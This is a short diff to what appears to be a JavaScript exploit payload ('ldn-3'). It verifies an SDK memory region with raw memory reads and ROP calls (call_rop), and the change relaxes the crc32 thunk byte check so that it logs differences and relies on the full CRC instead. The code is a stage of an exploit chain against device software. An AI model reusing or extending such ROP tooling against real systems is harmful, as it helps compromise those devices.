@@ -62,7 +62,7 @@
   };
   const SDK_BYTES = 0x602000n, CRC_EXPECT = 157086863n;
 
-  const VERSION = 'ldn-2';
+  const VERSION = 'ldn-3';
 
   async function standalone(qmFunc) {
     await say('payload ' + VERSION + ' standalone');
@@ -72,7 +72,7 @@
     const ok = t.size === SDK_BYTES && t.type === 3 && t.perm === 5;
     await say('[s1] sdk ' + hex(sdk) + ' size ' + hex(t.size) + ' type ' + t.type + ' perm ' + perms(t.perm) + (ok ? '' : '  MISMATCH'));
     if (!ok) return;
-    for (const name of ['memcpy', 'memmove', 'queryMemory', 'crc32']) {
+    for (const name of ['memcpy', 'memmove', 'queryMemory']) {
       const [off, hexBytes] = ART[name];
       const at = sdk + off;
       for (let j = 0; j * 2 < hexBytes.length; j++) {
@@ -85,9 +85,22 @@
       }
       await say('[s2] ' + name + ' verified at sdk+' + hex(off));
     }
-    const crc = call_rop(sdk + ART.crc32[0], 0n, sdk, SDK_BYTES, 0n);
-    if (crc !== CRC_EXPECT) { await say('standalone FAIL: sdk crc ' + crc); return; }
-    await say('[s3] sdk crc32 ' + crc);
+    // The crc32 thunk only needs its calling signature; the full-text CRC
+    // below is the identity check. Log thunk differences, don't fail on them.
+    const [crcOff, crcHex] = ART.crc32;
+    let crcNote = '';
+    for (let j = 0; j * 2 < crcHex.length; j++)
+      if (read8(sdk + crcOff + BigInt(j)) !== BigInt(parseInt(crcHex.substr(j * 2, 2), 16))) {
+        crcNote = ' (thunk byte ' + j + ': ' + crcHex.substr(j * 2, 2) + '->'
+          + Number(read8(sdk + crcOff + BigInt(j))).toString(16) + ')';
+        break;
+      }
+    const crc = call_rop(sdk + crcOff, 0n, sdk, SDK_BYTES, 0n);
+    if (crc !== CRC_EXPECT) {
+      await say('standalone FAIL: sdk crc ' + crc + ' expected ' + CRC_EXPECT + crcNote);
+      return;
+    }
+    await say('[s3] sdk crc32 ' + crc + crcNote);
     // Owned-memory challenge in the loader scratch, restored afterwards.
     const slot = malloc(0x100n);
     if (!slot) { await say('standalone FAIL: no scratch slot'); return; }
